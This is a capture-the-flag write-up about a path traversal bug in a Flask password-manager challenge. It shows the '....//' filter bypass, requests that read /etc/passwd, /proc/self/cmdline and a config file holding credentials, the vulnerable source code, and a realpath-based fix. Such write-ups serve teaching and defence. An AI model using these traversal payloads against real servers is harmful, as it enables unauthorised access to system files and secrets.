# Password Manager Path Traversal

**Category:** Web  
**Difficulty:** Medium  
**Points:** 250  
**Event:** Sample CTF 2024

## Challenge Description

A new password manager web application has been deployed. The developer claims it's secure, but can you find a way to access sensitive files on the server?

**URL:** `http://ctf.example.com:8080`

## Initial Reconnaissance

Upon visiting the application, I found a simple password manager interface with the following features:

- User registration and login
- Password storage and retrieval
- File upload functionality for "backup exports"
- Profile management

The application appeared to be built with Python Flask and had several interesting endpoints:

- `/login` - User authentication
- `/dashboard` - Main password manager interface  
- `/upload` - File upload for backup imports
- `/download/<filename>` - Download backup files
- `/profile` - User profile management

## Vulnerability Discovery

### 1. Directory Traversal in Download Endpoint

While exploring the download functionality, I noticed that the application allows users to download their backup files via the `/download/<filename>` endpoint.

Testing the endpoint with various payloads:

```bash
# Normal request
GET /download/backup.json
# Response: 200 OK - Returns backup file

# Path traversal attempts
GET /download/../../../etc/passwd
# Response: 403 Forbidden

GET /download/..%2F..%2F..%2Fetc%2Fpasswd  
# Response: 403 Forbidden

GET /download/....//....//....//etc/passwd
# Response: 200 OK - Success!
```

The application was vulnerable to a path traversal attack using the `....//` bypass technique.

### 2. File System Exploration

With the path traversal vulnerability confirmed, I began exploring the server's file system:

```bash
# Check system information
GET /download/....//....//....//etc/os-release
# Confirmed: Ubuntu 20.04 LTS

# Look for application files
GET /download/....//....//....//proc/self/cmdline
# Found: python3 /app/main.py

# Check application directory
GET /download/....//....//....//app/main.py
# Response: 200 OK - Source code retrieved!
```

## Exploitation

### Source Code Analysis

The downloaded source code revealed several critical issues:

```python
@app.route('/download/<filename>')
@login_required
def download_file(filename):
    # Vulnerable path construction
    file_path = os.path.join(UPLOAD_DIR, filename)
    
    # Insufficient path validation
    if '../' in filename:
        return "Access denied", 403
        
    return send_file(file_path)
```

The validation only checked for `../` but didn't account for other traversal techniques like `....//`.

### Finding the Flag

Based on the source code analysis, I discovered that the application stores a configuration file with database credentials:

```bash
GET /download/....//....//....//app/config.py
```

The config file contained:

```python
DATABASE_URL = "postgresql://user:password@localhost/pwmanager"
SECRET_KEY = "CTF{tr4v3rs4l_bugs_4r3_3v3rywh3r3!}"
```

## Flag

`CTF{tr4v3rs4l_bugs_4r3_3v3rywh3r3!}`

## Tools Used

- **Burp Suite** - For intercepting and modifying requests
- **curl** - For command-line testing
- **Browser Developer Tools** - For initial reconnaissance

## Mitigation

To prevent this vulnerability:

1. **Proper Input Validation**: Implement comprehensive path validation that blocks all traversal patterns
2. **Whitelist Approach**: Only allow downloads of files from a predefined list
3. **Sandboxing**: Store user files in a sandboxed directory with proper permissions
4. **Path Canonicalization**: Use `os.path.realpath()` to resolve and validate paths

```python
import os

def secure_download(filename):
    # Canonicalize the path
    safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    
    # Ensure the file is within the upload directory
    if not safe_path.startswith(os.path.realpath(UPLOAD_DIR)):
        return "Access denied", 403
        
    return send_file(safe_path)
```

## Lessons Learned

1. **Defense in Depth**: Multiple layers of validation are crucial
2. **Input Sanitization**: Never trust user input, even authenticated users
3. **Regular Security Audits**: Code review should include security considerations
4. **Principle of Least Privilege**: Limit file system access to only what's necessary

---

*This writeup demonstrates a common web application vulnerability. Always ensure proper input validation and follow secure coding practices.*
